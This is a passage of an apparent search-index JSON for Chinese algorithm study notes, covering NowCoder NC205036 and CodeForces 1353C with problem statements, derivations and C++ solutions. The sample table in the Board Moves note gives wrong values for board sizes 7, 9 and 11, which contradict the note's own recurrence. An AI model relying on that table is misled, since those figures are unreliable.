\u53ef\u60dc\u4ed6\u7ad6\u7740\u7684\u7b54\u9898\u5361\u586b\u6210\u4e86\u6a2a\u7740\u7684 : ( \u597d\u5947\u7684\u4ed6\u60f3\u77e5\u9053\u5bf9\u4e8e n \u9053\u9898\uff0c\u6bcf\u9053\u9898 n \u4e2a\u9009\u9879\u7684\u7b54\u9898\u5361 ( n \\times n \u7684\u77e9\u9635 )\uff0c\u6ee1\u8db3\u6a2a\u7b54\u9898\u5361\u548c\u7ad6\u7b54\u9898\u5361\u56fe\u5f62\u4e00\u81f4\u7684\u65b9\u6848\u6570\u6709\u591a\u5c11\u79cd\u3002 \u6ce8\uff1a\u6bcf\u9053\u9898\u53ea\u80fd\u9009\u62e9\u4e00\u4e2a\u9009\u9879\uff0c\u5373 n \\times n \u7684\u77e9\u9635\u4e2d\u53ea\u80fd\u6d82\u9ed1 n \u4e2a\u7a7a\u3002\u6c42\u6a2a\u7ad6\u5bf9\u79f0\u7684\u65b9\u6848\u6570\u3002 1.3. Input # \u7b2c\u4e00\u884c\u7ed9\u51fa n \u3002 1.4. Output # \u8f93\u51fa\u65b9\u6848\u6570\uff0c\u7b54\u6848\u5bf9 10^9 +7 \u53d6\u6a21 1.5. Sample Input # 3 1.6. Sample Output # 4 1.7. Notes # \\begin{pmatrix} \\blacksquare & \\square & \\square \\\\ \\square & \\blacksquare & \\square \\\\ \\square & \\square & \\blacksquare \\\\ \\end{pmatrix} \\Bigg| \\begin{pmatrix} \\square & \\blacksquare & \\square \\\\ \\blacksquare & \\square & \\square \\\\ \\square & \\square & \\blacksquare \\\\ \\end{pmatrix} \\Bigg| \\begin{pmatrix} \\blacksquare & \\square & \\square \\\\ \\square & \\square & \\blacksquare \\\\ \\square & \\blacksquare & \\square \\\\ \\end{pmatrix} \\Bigg| \\begin{pmatrix} \\square & \\square & \\blacksquare \\\\ \\square & \\blacksquare & \\square \\\\ \\blacksquare & \\square & \\square \\\\ \\end{pmatrix} 1.8. Source # \u725b\u5ba2\u7f51 NC205036 \u7b54\u9898\u5361 2. \u89e3\u8bfb # \u6bcf\u5f53\u77e9\u9635\u7684\u7ef4\u5ea6 n \u589e\u52a01\u65f6\uff0c\u53ef\u4ee5\u5206\u4e3a\u4e24\u79cd\u60c5\u51b5\u8ba1\u7b97\u3002 \u5982\u679c\u77e9\u9635\u7b2c n + 1 \u884c\u7684\u5143\u7d20\u5750\u6807\u4e3a (n + 1, n + 1) \uff0c\u5373\u5728\u77e9\u9635\u7684\u53f3\u4e0b\u89d2\u65f6\uff0c\u5219\u539f\u5148\u7684 n \\times n \u7ef4\u77e9\u9635\u53ef\u4ee5\u53d6 f(n) \u79cd\u60c5\u51b5\u3002 \u5982\u679c\u77e9\u9635\u7b2c n + 1 \u884c\u7684\u5143\u7d20\u5750\u6807\u4e3a (n + 1, x) \uff0c x \\in [1, n] \u65f6\uff0c\u5219\u7b2c x \u884c\u7684\u5750\u6807\u4e5f\u88ab\u786e\u5b9a\u4e86\uff0c\u4e3a (x, n + 1) \uff0c\u5176\u4f59\u7684 n - 1 \u884c\u53ef\u4ee5\u53d6 f(n - 1) \u79cd\u60c5\u51b5\u3002 \u5219\u9012\u63a8\u65b9\u7a0b\u4e3a f(n + 1) = f(n) + n \\times f(n-1) \u3002 \u53ef\u4ee5\u5316\u4e3a f(n) = f(n - 1) + (n - 1) \\times f(n-2) \u3002 \u5982\u5f53 n \u4ece 2 \u53d8\u4e3a 3 \u65f6\uff0c\u8fc7\u7a0b\u5982\u4e0b\u6240\u793a\u3002 n = 2 \u65f6\uff0c\u6709\u4e24\u79cd\u60c5\u51b5\u3002 \\begin{pmatrix} \\blacksquare & \\square \\\\ \\square & \\blacksquare \\\\ \\end{pmatrix} \\Bigg| \\begin{pmatrix} \\square & \\blacksquare \\\\ \\blacksquare & \\square \\\\ \\end{pmatrix} \u5f53 n = 3 \u4e14\u65b0\u589e\u7684\u5143\u7d20\u5728 (3, 3) \u4f4d\u7f6e\u65f6\uff0c\u6709 f(2) = 2 \u79cd\u60c5\u51b5 \\begin{pmatrix} \\blacksquare & \\square \\\\ \\square & \\blacksquare \\\\ \\end{pmatrix} \\to \\begin{pmatrix} \\blacksquare & \\square & \\square \\\\ \\square & \\blacksquare & \\square \\\\ \\square & \\square & \\blacksquare \\\\ \\end{pmatrix} \\Bigg| \\begin{pmatrix} \\square & \\blacksquare \\\\ \\blacksquare & \\square \\\\ \\end{pmatrix} \\to \\begin{pmatrix} \\square & \\blacksquare & \\square \\\\ \\blacksquare & \\square & \\square \\\\ \\square & \\square & \\blacksquare \\\\ \\end{pmatrix} \u5f53 n = 3 \u4e14\u65b0\u589e\u7684\u5143\u7d20\u5728 (3, x) \uff0c x \\in [1,2] \u4f4d\u7f6e\u65f6\uff0c\u6709 2 \\times f(1) = 2 \u79cd\u60c5\u51b5\u3002 \\begin{pmatrix} \\square & \\square & \\blacksquare \\\\ \\square & \\blacksquare & \\square \\\\ \\blacksquare & \\square & \\square \\\\ \\end{pmatrix} \\Bigg| \\begin{pmatrix} \\blacksquare & \\square & \\square \\\\ \\square & \\square & \\blacksquare \\\\ \\square & \\blacksquare & \\square \\\\ \\end{pmatrix} \u6240\u4ee5 f(3) = f(2) + 2 \\times f(1) = 2 + 2 = 4 \u3002 3. \u4ee3\u7801 # #include<iostream> using namespace std; const int mod=1e9+7; const int N=1e5+10; typedef long long ll; ll n; ll f[N]; int main() { int i; cin>>n; f[1]=1; f[2]=2; for (i=3;i<=n;i++) f[i]=(f[i-1]+(i-1)*f[i-2]%mod)%mod; cout<<f[n]<<endl; return 0; } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3.\u725b\u5ba2\u7f51 NC205036 \u7b54\u9898\u5361"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205036_%E7%AD%94%E9%A2%98%E5%8D%A1/#nc205036","text":"","title":"\u725b\u5ba2\u7f51 NC205036 \u7b54\u9898\u5361 \u52a8\u6001\u89c4\u5212"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205036_%E7%AD%94%E9%A2%98%E5%8D%A1/#_1","text":"\u725b\u5ba2\u7f51 NC205036 \u7b54\u9898\u5361 \u52a8\u6001\u89c4\u5212 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Notes 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205036_%E7%AD%94%E9%A2%98%E5%8D%A1/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205036_%E7%AD%94%E9%A2%98%E5%8D%A1/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 131072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205036_%E7%AD%94%E9%A2%98%E5%8D%A1/#12-problem-description","text":"\u725b\u725b\u5373\u5c06\u8981\u53c2\u52a0\u8003\u8bd5\uff0c\u4ed6\u5b66\u4f1a\u4e86\u586b\u7b54\u9898\u5361\u3002 \u53ef\u60dc\u4ed6\u7ad6\u7740\u7684\u7b54\u9898\u5361\u586b\u6210\u4e86\u6a2a\u7740\u7684 : ( \u597d\u5947\u7684\u4ed6\u60f3\u77e5\u9053\u5bf9\u4e8e n \u9053\u9898\uff0c\u6bcf\u9053\u9898 n \u4e2a\u9009\u9879\u7684\u7b54\u9898\u5361 ( n \\times n \u7684\u77e9\u9635 )\uff0c\u6ee1\u8db3\u6a2a\u7b54\u9898\u5361\u548c\u7ad6\u7b54\u9898\u5361\u56fe\u5f62\u4e00\u81f4\u7684\u65b9\u6848\u6570\u6709\u591a\u5c11\u79cd\u3002 \u6ce8\uff1a\u6bcf\u9053\u9898\u53ea\u80fd\u9009\u62e9\u4e00\u4e2a\u9009\u9879\uff0c\u5373 n \\times n \u7684\u77e9\u9635\u4e2d\u53ea\u80fd\u6d82\u9ed1 n \u4e2a\u7a7a\u3002\u6c42\u6a2a\u7ad6\u5bf9\u79f0\u7684\u65b9\u6848\u6570\u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205036_%E7%AD%94%E9%A2%98%E5%8D%A1/#13-input","text":"\u7b2c\u4e00\u884c\u7ed9\u51fa n \u3002","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205036_%E7%AD%94%E9%A2%98%E5%8D%A1/#14-output","text":"\u8f93\u51fa\u65b9\u6848\u6570\uff0c\u7b54\u6848\u5bf9 10^9 +7 \u53d6\u6a21","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205036_%E7%AD%94%E9%A2%98%E5%8D%A1/#15-sample-input","text":"3","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205036_%E7%AD%94%E9%A2%98%E5%8D%A1/#16-sample-output","text":"4","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205036_%E7%AD%94%E9%A2%98%E5%8D%A1/#17-notes","text":"\\begin{pmatrix} \\blacksquare & \\square & \\square \\\\ \\square & \\blacksquare & \\square \\\\ \\square & \\square & \\blacksquare \\\\ \\end{pmatrix} \\Bigg| \\begin{pmatrix} \\square & \\blacksquare & \\square \\\\ \\blacksquare & \\square & \\square \\\\ \\square & \\square & \\blacksquare \\\\ \\end{pmatrix} \\Bigg| \\begin{pmatrix} \\blacksquare & \\square & \\square \\\\ \\square & \\square & \\blacksquare \\\\ \\square & \\blacksquare & \\square \\\\ \\end{pmatrix} \\Bigg| \\begin{pmatrix} \\square & \\square & \\blacksquare \\\\ \\square & \\blacksquare & \\square \\\\ \\blacksquare & \\square & \\square \\\\ \\end{pmatrix}","title":"1.7. Notes"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205036_%E7%AD%94%E9%A2%98%E5%8D%A1/#18-source","text":"\u725b\u5ba2\u7f51 NC205036 \u7b54\u9898\u5361","title":"1.8. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205036_%E7%AD%94%E9%A2%98%E5%8D%A1/#2","text":"\u6bcf\u5f53\u77e9\u9635\u7684\u7ef4\u5ea6 n \u589e\u52a01\u65f6\uff0c\u53ef\u4ee5\u5206\u4e3a\u4e24\u79cd\u60c5\u51b5\u8ba1\u7b97\u3002 \u5982\u679c\u77e9\u9635\u7b2c n + 1 \u884c\u7684\u5143\u7d20\u5750\u6807\u4e3a (n + 1, n + 1) \uff0c\u5373\u5728\u77e9\u9635\u7684\u53f3\u4e0b\u89d2\u65f6\uff0c\u5219\u539f\u5148\u7684 n \\times n \u7ef4\u77e9\u9635\u53ef\u4ee5\u53d6 f(n) \u79cd\u60c5\u51b5\u3002 \u5982\u679c\u77e9\u9635\u7b2c n + 1 \u884c\u7684\u5143\u7d20\u5750\u6807\u4e3a (n + 1, x) \uff0c x \\in [1, n] \u65f6\uff0c\u5219\u7b2c x \u884c\u7684\u5750\u6807\u4e5f\u88ab\u786e\u5b9a\u4e86\uff0c\u4e3a (x, n + 1) \uff0c\u5176\u4f59\u7684 n - 1 \u884c\u53ef\u4ee5\u53d6 f(n - 1) \u79cd\u60c5\u51b5\u3002 \u5219\u9012\u63a8\u65b9\u7a0b\u4e3a f(n + 1) = f(n) + n \\times f(n-1) \u3002 \u53ef\u4ee5\u5316\u4e3a f(n) = f(n - 1) + (n - 1) \\times f(n-2) \u3002 \u5982\u5f53 n \u4ece 2 \u53d8\u4e3a 3 \u65f6\uff0c\u8fc7\u7a0b\u5982\u4e0b\u6240\u793a\u3002 n = 2 \u65f6\uff0c\u6709\u4e24\u79cd\u60c5\u51b5\u3002 \\begin{pmatrix} \\blacksquare & \\square \\\\ \\square & \\blacksquare \\\\ \\end{pmatrix} \\Bigg| \\begin{pmatrix} \\square & \\blacksquare \\\\ \\blacksquare & \\square \\\\ \\end{pmatrix} \u5f53 n = 3 \u4e14\u65b0\u589e\u7684\u5143\u7d20\u5728 (3, 3) \u4f4d\u7f6e\u65f6\uff0c\u6709 f(2) = 2 \u79cd\u60c5\u51b5 \\begin{pmatrix} \\blacksquare & \\square \\\\ \\square & \\blacksquare \\\\ \\end{pmatrix} \\to \\begin{pmatrix} \\blacksquare & \\square & \\square \\\\ \\square & \\blacksquare & \\square \\\\ \\square & \\square & \\blacksquare \\\\ \\end{pmatrix} \\Bigg| \\begin{pmatrix} \\square & \\blacksquare \\\\ \\blacksquare & \\square \\\\ \\end{pmatrix} \\to \\begin{pmatrix} \\square & \\blacksquare & \\square \\\\ \\blacksquare & \\square & \\square \\\\ \\square & \\square & \\blacksquare \\\\ \\end{pmatrix} \u5f53 n = 3 \u4e14\u65b0\u589e\u7684\u5143\u7d20\u5728 (3, x) \uff0c x \\in [1,2] \u4f4d\u7f6e\u65f6\uff0c\u6709 2 \\times f(1) = 2 \u79cd\u60c5\u51b5\u3002 \\begin{pmatrix} \\square & \\square & \\blacksquare \\\\ \\square & \\blacksquare & \\square \\\\ \\blacksquare & \\square & \\square \\\\ \\end{pmatrix} \\Bigg| \\begin{pmatrix} \\blacksquare & \\square & \\square \\\\ \\square & \\square & \\blacksquare \\\\ \\square & \\blacksquare & \\square \\\\ \\end{pmatrix} \u6240\u4ee5 f(3) = f(2) + 2 \\times f(1) = 2 + 2 = 4 \u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205036_%E7%AD%94%E9%A2%98%E5%8D%A1/#3","text":"#include<iostream> using namespace std; const int mod=1e9+7; const int N=1e5+10; typedef long long ll; ll n; ll f[N]; int main() { int i; cin>>n; f[1]=1; f[2]=2; for (i=3;i<=n;i++) f[i]=(f[i-1]+(i-1)*f[i-2]%mod)%mod; cout<<f[n]<<endl; return 0; } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/4.CodeForces_1353_C_Board_Moves/","text":"CodeForces 1353 C. Board Moves # \u76ee\u5f55 # CodeForces 1353 C. Board Moves \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Onput 1.5. Sample Input 1.6. Sample Onput 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1 second Memory Limit: 256 megabytes 1.2. Problem Description # You are given a board of size n \\times n , where n is odd (not divisible by 2 ). Initially, each cell of the board contains one figure. In one move, you can select exactly one figure presented in some cell and move it to one of the cells sharing a side or a corner with the current cell , i.e. from the cell (i, j) you can move the figure to cells: (i - 1, j - 1) ; (i - 1, j) ; (i - 1, j + 1) ; (i, j - 1) ; (i, j + 1) ; (i + 1, j - 1) ; (i + 1, j) ; (i + 1, j + 1) ; Of course, you can not move figures to cells out of the board. It is allowed that after a move there will be several figures in one cell. Your task is to find the minimum number of moves needed to get all the figures into one cell (i.e. n^2-1 cells should contain 0 figures and one cell should contain n^2 figures). You have to answer t independent test cases. 1.3. Input # The first line of the input contains one integer t ( 1 \\le t \\le 200 ) \u2014 the number of test cases. Then t test cases follow. The only line of the test case contains one integer n ( 1 \\le n < 5 \\cdot 10^5 ) \u2014 the size of the board. It is guaranteed that n is odd (not divisible by 2 ). It is guaranteed that the sum of n over all test cases does not exceed 5 \\cdot 10^5 ( \\sum n \\le 5 \\cdot 10^5 ). 1.4. Onput # For each test case print the answer \u2014 the minimum number of moves needed to get all the figures into one cell. 1.5. Sample Input # 3 1 5 499993 1.6. Sample Onput # 0 40 41664916690999888 1.7. Source # CodeForces 1353 C. Board Moves 2. \u89e3\u8bfb # \u901a\u8fc7\u89c2\u5bdf\u5efa\u7acb\u9012\u63a8\u65b9\u7a0b\uff0c\u4ece\u77e9\u9635\u4e2d\u5fc3\u5411\u5916\uff0c\u7b2c i \u5c42\u6709 8i \u4e2a\u5143\u7d20\uff0c\u9700\u8981\u79fb\u52a8 i \u6b21\u624d\u80fd\u5230\u8fbe\u77e9\u9635\u4e2d\u5fc3\u3002 f(i) = f(i-1) + 8 \\times (i-1)^2 \u5c06 i \u6362\u4e3a\u77e9\u9635\u7ef4\u5ea6 x \uff0c i = 2x-1 \u3002 f(2x-1) = f(2(x-1)-1) + 8 \\times (2(x-1)-1)^2 \\text{Table 1.\u6837\u4f8b\u6570\u636e\u8868} | x | 2x-1 | \u7ed3\u679c | \u5dee\u503c | | :---: | :----: | :---: | :---: | | 1 | 1 | 0 | | | 2 | 3 | 8 | 8 | | 3 | 5 | 40 | 32 | | 4 | 7 | 114 | 72 | | 5 | 9 | 506 | 392 | | 6 | 11 | 1164 | 648 | 3. \u4ee3\u7801 # #include <algorithm> #include <iostream> #include <string.h> const long long num = 5 * 1e5 + 1; using namespace std; long long list[num]; void calculate(long long n) { list[1] = 0; // \u9012\u63a8\u65b9\u7a0b // \u8fd9\u91cc\u7684 i \u4e00\u5b9a\u8981\u662f long long \uff0c\u4e0d\u7136\u4f1a\u6ea2\u51fa\uff0c\u731c\u6d4b\u662f(i - 1) * (i - 1)\u7528\u4e86i\u7684\u7c7b\u578b\u8fdb\u884c\u5b58\u50a8 for (long long i = 2; i < n; i++) { list[i] = list[i - 1] + 8 * (i - 1) * (i - 1); } } int main() { // test case long long t; long long n; // \u8ba1\u7b97 calculate((num + 1) / 2); // test case scanf(\"%lld\", &t); // for each test case while (t--) { // \u8f93\u5165 scanf(\"%lld\", &n); // \u8f93\u51fa printf(\"%lld\\n\", list[(n + 1) / 2]); } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"4.CodeForces 1353 C Board Moves"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/4.CodeForces_1353_C_Board_Moves/#codeforces-1353-c-board-moves","text":"","title":"CodeForces 1353 C. Board Moves"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/4.CodeForces_1353_C_Board_Moves/#_1","text":"CodeForces 1353 C. Board Moves \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Onput 1.5. Sample Input 1.6. Sample Onput 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/4.CodeForces_1353_C_Board_Moves/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/4.CodeForces_1353_C_Board_Moves/#11-limit","text":"Time Limit: 1 second Memory Limit: 256 megabytes","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/4.CodeForces_1353_C_Board_Moves/#12-problem-description","text":"You are given a board of size n \\times n , where n is odd (not divisible by 2 ). Initially, each cell of the board contains one figure. In one move, you can select exactly one figure presented in some cell and move it to one of the cells sharing a side or a corner with the current cell , i.e. from the cell (i, j) you can move the figure to cells: (i - 1, j - 1) ; (i - 1, j) ; (i - 1, j + 1) ; (i, j - 1) ; (i, j + 1) ; (i + 1, j - 1) ; (i + 1, j) ; (i + 1, j + 1) ; Of course, you can not move figures to cells out of the board. It is allowed that after a move there will be several figures in one cell. Your task is to find the minimum number of moves needed to get all the figures into one cell (i.e. n^2-1 cells should contain 0 figures and one cell should contain n^2 figures). You have to answer t independent test cases.","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/4.CodeForces_1353_C_Board_Moves/#13-input","text":"The first line of the input contains one integer t ( 1 \\le t \\le 200 ) \u2014 the number of test cases. Then t test cases follow. The only line of the test case contains one integer n ( 1 \\le n < 5 \\cdot 10^5 ) \u2014 the size of the board. It is guaranteed that n is odd (not divisible by 2 ). It is guaranteed that the sum of n over all test cases does not exceed 5 \\cdot 10^5 ( \\sum n \\le 5 \\cdot 10^5 ).","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/4.CodeForces_1353_C_Board_Moves/#14-onput","text":"For each test case print the answer \u2014 the minimum number of moves needed to get all the figures into one cell.","title":"1.4. Onput"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/4.CodeForces_1353_C_Board_Moves/#15-sample-input","text":"3 1 5 499993","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/4.CodeForces_1353_C_Board_Moves/#16-sample-onput","text":"0 40 41664916690999888","title":"1.6. Sample Onput"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/4.CodeForces_1353_C_Board_Moves/#17-source","text":"CodeForces 1353 C. Board Moves","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/4.CodeForces_1353_C_Board_Moves/#2","text":"\u901a\u8fc7\u89c2\u5bdf\u5efa\u7acb\u9012\u63a8\u65b9\u7a0b\uff0c\u4ece\u77e9\u9635\u4e2d\u5fc3\u5411\u5916\uff0c\u7b2c i \u5c42\u6709 8i \u4e2a\u5143\u7d20\uff0c\u9700\u8981\u79fb\u52a8 i \u6b21\u624d\u80fd\u5230\u8fbe\u77e9\u9635\u4e2d\u5fc3\u3002 f(i) = f(i-1) + 8 \\times (i-1)^2 \u5c06 i \u6362\u4e3a\u77e9\u9635\u7ef4\u5ea6 x \uff0c i = 2x-1 \u3002 f(2x-1) = f(2(x-1)-1) + 8 \\times (2(x-1)-1)^2 \\text{Table 1.\u6837\u4f8b\u6570\u636e\u8868} | x | 2x-1 | \u7ed3\u679c | \u5dee\u503c | | :---: | :----: | :---: | :---: | | 1 | 1 | 0 | | | 2 | 3 | 8 | 8 | | 3 | 5 | 40 | 32 | | 4 | 7 | 114 | 72 | | 5 | 9 | 506 | 392 | | 6 | 11 | 1164 | 648 |","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/4.CodeForces_1353_C_Board_Moves/#3","text":"#include <algorithm> #include <iostream> #include <string.h> const long long num = 5 * 1e5 + 1; using namespace std; long long list[num]; void calculate(long long n) { list[1] = 0; // \u9012\u63a8\u65b9\u7a0b // \u8fd9\u91cc\u7684 i \u4e00\u5b9a\u8981\u662f long long \uff0c\u4e0d\u7136\u4f1a\u6ea2\u51fa\uff0c\u731c\u6d4b\u662f(i - 1) * (i - 1)\u7528\u4e86i\u7684\u7c7b\u578b\u8fdb\u884c\u5b58\u50a8 for (long long i = 2; i < n; i++) { list[i] = list[i - 1] + 8 * (i - 1) * (i - 1); } } int main() { // test case long long t; long long n; // \u8ba1\u7b97 calculate((num + 1) / 2); // test case scanf(\"%lld\", &t); // for each test case while (t--) { // \u8f93\u5165 scanf(\"%lld\", &n); // \u8f93\u51fa printf(\"%lld\\n\", list[(n + 1) / 2]); } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. 